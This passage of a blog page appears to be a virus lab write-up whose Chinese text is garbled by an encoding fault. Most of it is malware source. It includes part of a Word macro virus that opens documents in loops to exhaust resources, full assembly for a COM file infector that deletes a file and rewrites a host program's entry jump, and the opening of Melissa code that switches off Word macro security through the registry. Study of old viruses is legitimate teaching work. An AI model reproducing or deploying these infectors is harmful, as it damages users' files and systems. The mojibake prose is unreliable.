class="line">Selection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter</span><br><span class="line"></span><br><span class="line">&#39; è®¾ç½®å±…ä¸­å¯¹é½</span><br><span class="line"></span><br><span class="line">Beep</span><br><span class="line"></span><br><span class="line">With Selection.Font</span><br><span class="line"></span><br><span class="line">&#39;è®¾ç½®æ–‡æœ¬å­—ä½“</span><br><span class="line"></span><br><span class="line">.Name &#x3D; &quot;é»‘ä½“&quot;</span><br><span class="line"></span><br><span class="line">&#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºé»‘ä½“</span><br><span class="line"></span><br><span class="line">.Size &#x3D; 16</span><br><span class="line"></span><br><span class="line">&#39;è®¾ç½®æ–‡æœ¬å­—ä½“å¤§å°ä¸º16</span><br><span class="line"></span><br><span class="line">.Bold &#x3D; 1</span><br><span class="line"></span><br><span class="line">&#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºç²—ä½“</span><br><span class="line"></span><br><span class="line">.Underline &#x3D; 1</span><br><span class="line"></span><br><span class="line">&#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºä¸‹åˆ’çº¿</span><br><span class="line"></span><br><span class="line">.Color &#x3D; wdColorRose</span><br><span class="line"></span><br><span class="line">&#39;è®¾ç½®æ–‡æœ¬å­—ä½“é—®ç«ç‘°çº¢è‰²</span><br><span class="line"></span><br><span class="line">End With</span><br><span class="line"></span><br><span class="line">Selection.InsertAfter Text &#x3D; &quot;ä»€ä¹ˆæ˜¯å®ç—…æ¯’ï¼Ÿ&quot; &#39;åµŒå…¥æ–‡æœ¬</span><br><span class="line"></span><br><span class="line">Selection.InsertParagraphAfter &#39;æ¢è¡Œ</span><br><span class="line"></span><br><span class="line">Beep</span><br><span class="line"></span><br><span class="line">Selection.InsertAfter Text:&#x3D;&quot;ç­”æ¡ˆï¼š&quot; &#39;åµŒå…¥æ–‡æœ¬</span><br><span class="line"></span><br><span class="line">Selection.Font.Italic &#x3D; 1 &#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºæ–œä½“</span><br><span class="line"></span><br><span class="line">Selection.InsertAfter Text:&#x3D;&quot;æˆ‘å°±æ˜¯&quot; &#39;åµŒå…¥æ–‡æœ¬</span><br><span class="line"></span><br><span class="line">Selection.InsertParagraphAfter &#39;æ¢è¡Œ</span><br><span class="line"></span><br><span class="line">Selection.InsertParagraphAfter &#39;æ¢è¡Œ</span><br><span class="line"></span><br><span class="line">Selection.Font.Italic &#x3D; 0 &#39;æ’¤é”€æ–‡æœ¬ä¸ºæ–œä½“</span><br><span class="line"></span><br><span class="line">Beep</span><br><span class="line"></span><br><span class="line">Selection.InsertAfter Text:&#x3D;&quot;å¦‚ä½•é˜²å¾¡å®ç—…æ¯’&quot; &#39;åµŒå…¥æ–‡æœ¬</span><br><span class="line"></span><br><span class="line">Selection.InsertParagraphAfter &#39;æ¢è¡Œ</span><br><span class="line"></span><br><span class="line">Selection.InsertParagraphAfter &#39;æ¢è¡Œ</span><br><span class="line"></span><br><span class="line">Beep</span><br><span class="line"></span><br><span class="line">Selection.InsertAfter Text:&#x3D;&quot;ç­”æ¡ˆï¼š&quot; &#39;åµŒå…¥æ–‡æœ¬</span><br><span class="line"></span><br><span class="line">Selection.Font.Italic &#x3D; 1 &#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºæ–œä½“</span><br><span class="line"></span><br><span class="line">Selection.InsertAfter Text:&#x3D;&quot;åˆ«çœ‹æˆ‘&quot; &#39;åµŒå…¥æ–‡æœ¬</span><br><span class="line"></span><br><span class="line">MsgBox &quot;æŒ‰ç¡®å®šé”®ï¼Œæˆ‘å°†å‘Šè¯‰ä½ ä¸€ä¸ªç§˜å¯†......&quot;, &quot;å¥½å§ï¼Œå‘Šè¯‰ä½ å§ï¼&quot;</span><br><span class="line"></span><br><span class="line">GoTo out &#39;é€€å‡ºgotoè¯­å¥</span><br><span class="line"></span><br><span class="line">&#39;è¾“å…¥ç­”æ¡ˆä¸æ­£ç¡®åå°†è¦æ‰§è¡Œçš„è¯­å¥</span><br><span class="line"></span><br><span class="line">Else &#39;æ‰§è¡Œelseè¯­å¥ï¼Œä¹Ÿå°±æ˜¯å›ç­”é”™è¯¯åå°†è¦æ‰§è¡Œçš„</span><br><span class="line"></span><br><span class="line">Count &#x3D; Count + 1 &#39;count++ï¼Œæœ¬æ¥countåˆå§‹åŒ–ä¸º0</span><br><span class="line"></span><br><span class="line">For j &#x3D; 1 To 20 &#39;æ‰§è¡Œå¾ªç¯è¯­å¥ï¼Œå¾ªç¯20æ¬¡</span><br><span class="line"></span><br><span class="line">Beep</span><br><span class="line"></span><br><span class="line">Documents.Add &#39;å¢åŠ ä¸€ä¸ªç°åœ¨è¿™ä¸ªæ–‡æ¡£</span><br><span class="line"></span><br><span class="line">Next j</span><br><span class="line"></span><br><span class="line">Selection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter</span><br><span class="line"></span><br><span class="line">&#39;è®¾ç½®æ–‡æœ¬æ ¼å¼ä¸ºå±…ä¸­å¯¹é½</span><br><span class="line"></span><br><span class="line">Selection.InsertAfter Text:&#x3D;&quot;å®ç—…æ¯’&quot; &#39;åµŒå…¥ä¸€ä¸ªæ–‡æœ¬</span><br><span class="line"></span><br><span class="line">If Count &#x3D; 2 Then GoTo out</span><br><span class="line"></span><br><span class="line">&#39;åˆ¤æ–­æ˜¯å¦æ‰§è¡Œæ‰“å¼€è¯¥æ–‡æœ¬æ“ä½œå¤Ÿ2ä¸ª20æ¬¡ï¼Œå¦‚æœå¤Ÿäº†å°±é€€å‡ºgotoè¯­å¥</span><br><span class="line"></span><br><span class="line">GoTo try</span><br><span class="line"></span><br><span class="line">WordBasic.filedefault &#39;é€€å‡ºWordBasicæ–‡æœ¬</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">Wend &#39;ç»“æŸwithè¯­å¥</span><br><span class="line"></span><br><span class="line">out: &#39;é€€å‡º</span><br><span class="line"></span><br><span class="line">End Sub &#39;é€€å‡ºSub</span><br></pre></td></tr></table></figure><p>å­¦ä¹ äº†å®ç—…æ¯’çš„ç»“æ„ å’Œ å»é™¤å®ç—…æ¯’çš„æ–¹æ³•</p><p>ç»“æ„</p><ul><li><p>  å±è”½çŠ¶æ€æ ï¼Œä»¥å…æ˜¾ç¤ºå®ç—…æ¯’æ‰§è¡ŒçŠ¶æ€ï¼›ä¿®æ”¹å…¬ç”¨æ¨¡ç‰ˆæ˜¯è‡ªåŠ¨ä¿å­˜ä¸”ä¸æç¤ºï¼›è‡ªåŠ¨æ‰§è¡Œç—…æ¯’æ¨¡æ¿</p></li><li><p>  åˆ¤æ–­æ˜¯å¦æ˜¯ å…¬ç”¨æ¨¡æ¿ ï¼Œå¦åˆ™å¤åˆ¶åˆ°å…±ç”¨æ¨¡æ¿</p></li><li><p>  é€šè¿‡é¦–è¡Œå†…å®¹åˆ¤æ–­æ˜¯å¦æ„ŸæŸ“ç—…æ¯’</p></li><li><p>  æ‰§è¡Œç—…æ¯’ä¸»ä½“</p></li></ul><p>åˆ©ç”¨å¤šå¼€çª—å£ç­‰æ–¹å¼è€—å°½ç³»ç»Ÿèµ„æºä»¥å½±å“ä½¿ç”¨</p><h2 id="COMç—…æ¯’å®éªŒ"><a href="#COMç—…æ¯’å®éªŒ" class="headerlink" title="COMç—…æ¯’å®éªŒ"></a>COMç—…æ¯’å®éªŒ</h2><ol><li>COMæ–‡ä»¶çš„ç‰¹ç‚¹</li></ol><p>COMæ–‡ä»¶æ˜¯DOSçš„ä¸€ç§äºŒè¿›åˆ¶ä»£ç çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ŒCOMæ–‡ä»¶ç»“æ„æ¯”è¾ƒç®€å•ï¼ŒåŠ è½½è¿‡ç¨‹ååˆ†è¿…é€Ÿã€‚æ•´ä¸ªç¨‹åºåªæœ‰ä¸€ä¸ªæ®µã€‚å› æ­¤å…¨éƒ¨ä»£ç é•¿åº¦å¿…é¡»å°äº64Kï¼Œå…¶å…¥å£ä»£ç åœ°å€æ˜¯CS:100Hã€‚DOSè£…å…¥COMæ–‡ä»¶æ—¶ï¼Œå…ˆåœ¨å†…å­˜å»ºç«‹ä¸€ä¸ªé•¿åº¦ä¸º100Hçš„ç¨‹åºå‰ç¼€æ®µ(PSPï¼Œç”±DOSå»ºç«‹ï¼Œæ˜¯DOSç”¨æˆ·ç¨‹åºå’Œå‘½ä»¤è¡Œä¹‹é—´çš„æ¥å£)ï¼Œç„¶åå°†æ•´ä¸ªæ–‡ä»¶è£…è½½äºPSPä¸Šç«¯ï¼Œä¸è¿›è¡Œé‡å®šä½æ“ä½œï¼Œæ¥ç€å°†å››ä¸ªæ®µåœ°å€å¯„å­˜å™¨DS(Data<br>Segment)ï¼ŒCS(Code Segment)ï¼ŒSS(Stack Segment)ï¼ŒES(Extra Segment)åˆå§‹åŒ–ä¸ºç¨‹åºå‰ç¼€æ®µ(PSP)çš„æ®µåœ°å€ï¼Œæœ€åå°†ç¨‹åºçš„æ§åˆ¶æƒäº¤äºCS:100Hå¤„ã€‚å¦‚è¡¨ä¸€æ‰€ç¤ºï¼š</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image21.png" class="" width="21"><p>è¡¨1ï¼šCOMç—…æ¯’çš„è£…å…¥å’Œæ‰§è¡Œ</p><ol start="2"><li>ç—…æ¯’åŸç†</li></ol><p>COMç—…æ¯’æ„ŸæŸ“ä¸€èˆ¬æœ‰ä¸¤ç§é€”å¾„ï¼Œä¸€ç§æ˜¯å°†è‡ªèº«ä»£ç é™„åŠ åˆ°å®¿ä¸»ç¨‹åºä¹‹å‰ï¼Œç—…æ¯’æ‰§è¡Œå®Œåæ¢å¤å¯„ç”Ÿç¨‹åºåŸå…ˆçš„çŠ¶æ€ï¼Œå¹¶ç”¨JMP<br>FARç­‰æŒ‡ä»¤ä½¿ç¨‹åºå†æ¬¡å›åˆ°CS:100Hå¤„ï¼Œä»¥ç¡®ä¿å¯„ç”Ÿç¨‹åºä¸PSPçš„ä¸€è‡´ã€‚ä½†æ›´ä¸ºå¸¸è§çš„ç—…æ¯’ä¸ºé‡‡ç”¨ä¿å­˜æ–‡ä»¶å¤´è‹¥å¹²å­—èŠ‚ï¼Œå¹¶å°†ç¬¬ä¸€æ¡æŒ‡ä»¤æ”¹ä¸ºâ€JMP<br>ç—…æ¯’å…¥å£â€ï¼Œä»¥ç¡®ä¿ç—…æ¯’æœ€å…ˆæ‰§è¡Œã€‚ç—…æ¯’æ‰§è¡Œå®Œåï¼Œä¼šæ¢å¤å¹¶è¿è¡ŒåŸæ–‡ä»¶ï¼Œä»¥ä¾¿ä¼ æ’­ï¼Œå½“å…¶å°†åŸæ–‡ä»¶å‚æ•°å…¨éƒ¨æ¢å¤åï¼Œä¼šå°†æ§åˆ¶æƒäº¤äºCS:100Hå¤„ã€‚</p><h4 id="å¸¦æ„ŸæŸ“çš„COMæ–‡ä»¶"><a href="#å¸¦æ„ŸæŸ“çš„COMæ–‡ä»¶" class="headerlink" title="å¸¦æ„ŸæŸ“çš„COMæ–‡ä»¶"></a>å¸¦æ„ŸæŸ“çš„COMæ–‡ä»¶</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">proqram seqment</span><br><span class="line"></span><br><span class="line">assume cs:program,ds:program,ss:program,es:program</span><br><span class="line"></span><br><span class="line">org 0100h # ç½®ç¨‹åºçš„åˆå€¼ä¸º100hï¼Œå¼€å§‹ç¨‹åºçš„è¿è¡Œ</span><br><span class="line">MOV AX, SEG MESSAGE # å°† message æ®µåœ°å€èµ‹ç»™AXå¯„å­˜å™¨</span><br><span class="line">MOV DS, AX #</span><br><span class="line">MOV DX, offset message #å°†åç§»é‡èµ‹ç»™ DX</span><br><span class="line">MOV AH, 09h #æ‰“å°å­—ç¬¦ä¸²</span><br><span class="line">INT 21h</span><br><span class="line">MOV AH, 4Ch # ç»ˆæ­¢ç¨‹åº è¿”å› DOS</span><br><span class="line">INT 21h</span><br><span class="line">RET</span><br><span class="line"></span><br><span class="line">message db&quot;This a simple com program for a test ???&quot;,0dh,0ah,&quot;$&quot;</span><br><span class="line"></span><br><span class="line">program ends</span><br><span class="line"></span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>ç—…æ¯’çš„ASMæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">CSEG SEGMENT</span><br><span class="line"></span><br><span class="line">ASSUME CS:CSEG,DS:CSEG,SS:CSEG</span><br><span class="line"></span><br><span class="line">main PROC NEAR</span><br><span class="line"></span><br><span class="line">mainstart:</span><br><span class="line"></span><br><span class="line">CALL vstart ;ç—…æ¯’ä»£ç å¼€å§‹å¤„</span><br><span class="line"></span><br><span class="line">vstart:</span><br><span class="line"></span><br><span class="line">POP SI #å¾—åˆ°å½“å‰åœ°å€</span><br><span class="line">MOV BP,SI #ä¿å­˜å½“å‰åœ°å€</span><br><span class="line">PUSH SI</span><br><span class="line">MOV AH,9</span><br><span class="line">ADD SI,OFFSET message-OFFSET vstart #æ˜¾ç¤ºé¢„è®¾å­—ç¬¦ä¸²</span><br><span class="line">MOV DX,SI</span><br><span class="line">INT 21h</span><br><span class="line">POP SI</span><br><span class="line">ADD SI,OFFSET yuan4byte-OFFSET vstart #å–å¾—åŸç¨‹åºå‰å››ä¸ªå­—èŠ‚</span><br><span class="line">MOV DI,100h #ç›®çš„åœ°å€</span><br><span class="line">MOV AX,DS:[SI] #å¼€å§‹å¤åˆ¶</span><br><span class="line">MOV DS:[DI],AX</span><br><span class="line">INC SI</span><br><span class="line">INC SI</span><br><span class="line">INC DI</span><br><span class="line">INC DI</span><br><span class="line">MOV AX,DS:[SI]</span><br><span class="line">MOV DS:[DI],AX</span><br><span class="line">MOV SI,BP #æ¢å¤åœ°å€å€¼</span><br><span class="line">MOV DX,OFFSET delname-OFFSET vstart #å¾—åˆ°åˆ é™¤æ–‡ä»¶å</span><br><span class="line">ADD DX,SI</span><br><span class="line">MOV AH,41h</span><br><span class="line">INT 21h</span><br><span class="line">MOV DX,OFFSET filename-OFFSET vstart#å¾—åˆ°è¦æ„ŸæŸ“æ–‡ä»¶å</span><br><span class="line">ADD DX,SI</span><br><span class="line">MOV AL,02</span><br><span class="line">MOV AH,3dhF#å†™æ–‡ä»¶</span><br><span class="line">INT 21h</span><br><span class="line"></span><br><span class="line">JC error</span><br><span class="line">MOV BX,AX#æ–‡ä»¶å¥æŸ„</span><br><span class="line">MOV DX,OFFSET yuan4byte-OFFSET vstart#è¯»æ–‡ä»¶å‰å››ä¸ªå­—èŠ‚</span><br><span class="line">ADD DX,SI</span><br><span class="line">MOV CX,4</span><br><span class="line">MOV AH,3fh</span><br><span class="line">INT 21h</span><br><span class="line">MOV AX,4202h#åˆ°æ–‡ä»¶å°¾</span><br><span class="line">XOR CX,CX</span><br><span class="line">XOR DX,DX</span><br><span class="line">INT 21h</span><br><span class="line">MOV DI,OFFSET new4byte-OFFSET vstart#ä¿å­˜è¦è·³çš„åœ°æ–¹</span><br><span class="line">ADD DI,2</span><br><span class="line">ADD DI,SI</span><br><span class="line">SUB AX,4</span><br><span class="line">MOV DS:[DI],AX</span><br><span class="line">ADD SI,OFFSET mainstart-OFFSET vstart#å‡†å¤‡å†™å…¥ç—…æ¯’</span><br><span class="line">MOV DX,SI</span><br><span class="line">MOV vsizes,OFFSET vends-OFFSET mainstart</span><br><span class="line">MOV CX,vsizes</span><br><span class="line">MOV AH,40h</span><br><span class="line">INT 21h</span><br><span class="line">MOV SI,BP#å®šä½åˆ°æ–‡ä»¶å¤´</span><br><span class="line">MOV AL,0</span><br><span class="line">XOR CX,CX</span><br><span class="line">XOR DX,DX</span><br><span class="line">MOV AH,42h</span><br><span class="line">INT 21h</span><br><span class="line">MOV AH,40h#å°†æ–°çš„æ–‡ä»¶å¤´å†™å…¥</span><br><span class="line">MOV CX,4</span><br><span class="line">MOV DX,OFFSET new4byte-OFFSET vstart</span><br><span class="line">ADD DX,SI</span><br><span class="line">INT 21h</span><br><span class="line">MOV AH,3eh#å…³é—­æ–‡ä»¶</span><br><span class="line">INT 21h</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line"></span><br><span class="line">MOV AX,100h</span><br><span class="line">PUSH AX</span><br><span class="line">RET</span><br><span class="line"></span><br><span class="line">main ENDP</span><br><span class="line"></span><br><span class="line">yuan4byte:</span><br><span class="line"></span><br><span class="line">RET ; ??</span><br><span class="line"></span><br><span class="line">DB 3 DUP (?)</span><br><span class="line"></span><br><span class="line">vsizes DW 0</span><br><span class="line"></span><br><span class="line">new4byte DB &#39;M&#39;,0e9h,0,0</span><br><span class="line"></span><br><span class="line">filename DB &quot;test.com&quot;,0</span><br><span class="line"></span><br><span class="line">delname DB &quot;del.txt&quot;,0</span><br><span class="line"></span><br><span class="line">message DB &quot;You are infected by a simple com virus~~&quot;</span><br><span class="line"></span><br><span class="line">DB 0dh,0ah,&quot;$&quot;</span><br><span class="line"></span><br><span class="line">vends:</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line"></span><br><span class="line">MOV AX,CSEG</span><br><span class="line">MOV DS,AX</span><br><span class="line">MOV SS,AX</span><br><span class="line">CALL main</span><br><span class="line">MOV AX,4c00h</span><br><span class="line">INT 21h</span><br><span class="line">CSEG ENDS</span><br><span class="line">END start</span><br></pre></td></tr></table></figure><p>åˆ†æçš„æœ‰è¶£çš„ç‚¹</p><ol><li><p> DOSä¸‹comæ–‡ä»¶çš„åŠ è½½æ—¶ä¸€å¯¹ä¸€çš„æ˜ å°„çš„ï¼Œæ²¡æœ‰PEç»“æ„é‚£æ ·çš„MZå¤´å’ŒPEå¤´</p></li><li><p> COMæ–‡ä»¶åŠ è½½ä»£ç çš„åŸºå€æ˜¯100Hï¼Œ0~100Hæ˜¯PSPç»“æ„ï¼ŒCOMæ–‡ä»¶åªæœ‰ä¸€ä¸ªæ®µï¼Œæ‰€ä»¥DSï¼ŒESâ€¦â€¦æ®µå¯„å­˜å™¨éƒ½æŒ‡å‘PSP</p></li><li><p> COMæ–‡ä»¶æ²¡æœ‰å †æ ˆæ®µï¼Œç”¨debugè°ƒè¯•å‘ç°ï¼Œspï¼šFFFEï¼Œbpï¼š0000ï¼Œbpå¯„å­˜å™¨ç»è¿‡æµ‹è¯•å¯ä»¥ç”¨æ¥å­˜å‚¨å…¶ä»–çš„å€¼å¯¹è¿è¡Œæ²¡æœ‰å½±å“</p></li><li><p> ç—…æ¯’ä»£ç ä½¿ç”¨call popç»„åˆæ‹¿åˆ°popå¤„ä»£ç çš„ç»å¯¹åœ°å€ï¼Œä»¥å®ç°é‡å®šä½</p></li><li><p>é€šè¿‡å¯¹è¢«æ„ŸæŸ“æ–‡ä»¶çš„å‰4å­—èŠ‚å¡«å……ä¸º sub bpï¼Œ jmp<br> shellcodeå®ç°shellcodeè·³è½¬ï¼Œè¿›å…¥shellcodeé¦–å…ˆæ¢å¤å‰4å­—èŠ‚ï¼Œç„¶åæ‰§è¡Œå®Œæµç¨‹åé€šè¿‡push<br> 100H,retè¿”å›åŸç¨‹åº</p></li><li><p> åœ¨è¿™é‡ŒMé™¤äº†èº²é¿æ€æ¯’è½¯ä»¶çš„æŸ¥æ€æˆ‘æ²¡æƒ³åˆ°å…¶ä»–ä½œç”¨ï¼Œåˆ æ‰ä¸å½±å“è¿è¡Œï¼ˆä½†æ˜¯é¦–åœ°å€çš„jmpçš„ç›®æ ‡åœ°å€éœ€è¦å¯¹åº”çš„ä¿®æ”¹ï¼‰</p></li><li><p> yuan4byteä¸­retçš„ä½œç”¨ï¼šè®©ç—…æ¯’ç¨‹åºè¿”å›Mainå‡½æ•°ï¼ŒæˆåŠŸè¿è¡Œå®Œæ•´ä¸ªæµç¨‹</p></li><li><p>ä¸ºä»€ä¹ˆè¦SUB<br> AX,4ï¼šç±»ä¼¼äºinline-hookï¼Œjmpç›¸å¯¹åœ°å€ï¼Œéœ€è¦å‡å»jmpè¯­å¥æ‰€åœ¨çš„åç§»åœ°å€å†-jmpæœ¬èº«çš„é•¿åº¦</p></li></ol><h2 id="æ¢…ä¸½èç—…æ¯’å®éªŒ"><a href="#æ¢…ä¸½èç—…æ¯’å®éªŒ" class="headerlink" title="æ¢…ä¸½èç—…æ¯’å®éªŒ"></a>æ¢…ä¸½èç—…æ¯’å®éªŒ</h2><p>ä»£ç </p><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">Sub autoOpen()</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line"></span><br><span class="line">&#39;*</span><br><span class="line">ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¾ªç¯å‘é€é‚®ä»¶ç¨‹åºéƒ¨åˆ†</span><br><span class="line"></span><br><span class="line">If System.PrivateProfileString(&quot;&quot;</span><br><span class="line">,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,</span><br><span class="line">&quot;Level&quot;) &lt;&gt; &quot;&quot; Then &#39;æ³¨å†Œè¡¨é¡¹åˆ¤æ–­</span><br><span class="line"></span><br><span class="line">CommandBars(&quot;Macro&quot;).Controls(&quot;Security...&quot;).Enabled &#x3D; False</span><br><span class="line"></span><br><span class="line">&#39;å®å·¥å…·æ å®‰å…¨é€‰é¡¹å¤±æ•ˆ</span><br><span class="line"></span><br><span class="line">System.PrivateProfileString(&quot;&quot;,</span><br><span class="line">&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,</span><br><span class="line">&quot;Level&quot;) &#x3D; 1&amp;</span><br><span class="line"></span><br><span class="line">Else</span><br><span class="line"></span><br><span class="line">CommandBars(&quot;Tools&quot;).Controls(&quot;Macro&quot;).Enabled &#x3D; False</span><br><span class="line"></span><br><span class="line">&#39;å·¥å…·èœå•æ å®é€‰é¡¹å¤±æ•ˆ</span><br><span class="line"></span><br><span 